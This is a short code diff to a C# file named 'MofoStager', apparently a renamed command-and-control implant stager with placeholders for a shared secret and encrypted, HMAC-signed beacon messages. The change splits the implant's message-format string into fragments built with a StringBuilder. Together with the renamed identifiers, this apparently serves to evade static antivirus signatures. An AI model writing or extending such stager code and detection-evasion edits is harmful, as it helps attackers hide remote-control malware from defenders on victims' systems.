@@ -43,7 +43,7 @@ namespace MofoStager
                 string aSOMEID = @"{{REP_MOFO_SOMEID}}";
                 string SOMEID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                 byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REP_MOFO_SHARED_SECRET_PASSWORD}}");
-                string MessageFormat = @"{{""SOMEID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncMsg"":""{4}"",""HMAC"":""{5}""}}";
+                string MessageFormat = GetMessageFormat;
 
                 Aes InstallAESKey = Aes.Create();
                 InstallAESKey.Mode = CipherMode.CBC;
@@ -207,6 +207,19 @@ namespace MofoStager
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
         }
+	    public static string GetMessageFormat
+{
+    get
+    {
+        var sb = new StringBuilder(@"{{""SOMEID"":""{0}"",");
+        sb.Append(@"""Type"":{1},");
+        sb.Append(@"""Meta"":""{2}"",");
+        sb.Append(@"""IV"":""{3}"",");
+        sb.Append(@"""EncMsg"":""{4}"",");
+        sb.Append(@"""HMAC"":""{5}""}}");
+        return sb.ToString();
+    }
+}
 
         public class MofosWebClient : WebClient
         {
